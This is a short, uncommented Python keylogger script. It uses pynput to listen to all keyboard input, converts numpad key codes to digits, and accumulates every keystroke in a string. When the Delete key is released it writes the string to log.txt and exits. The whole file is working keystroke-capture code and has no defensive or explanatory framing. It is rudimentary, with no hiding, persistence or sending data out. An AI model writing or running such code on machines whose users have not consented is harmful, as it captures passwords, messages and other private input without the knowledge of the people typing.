import pynput
import sys
from pynput.keyboard import Key, Listener

proper = {"<96>": "0", "<97>": "1", "<98>": "2", "<99>": "3", "<100>": "4", "<101>": "5", "<102>": "6", "<103>": "7", "<104>": "8", "<105>": "9"}

log = ""

def fix_key(key):
    key = str(key).replace("Key.", "")
    key = str(key).replace("\'", "")

    if key in proper:
        key = proper[key]

    return key

def on_press(key):
    global log

    key = fix_key(key)
    log = log + " " + key

def on_release(key):
    key = fix_key(key)

    if key == "delete":
        with open("log.txt", "w") as f:
            f.write(log)
        sys.exit()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
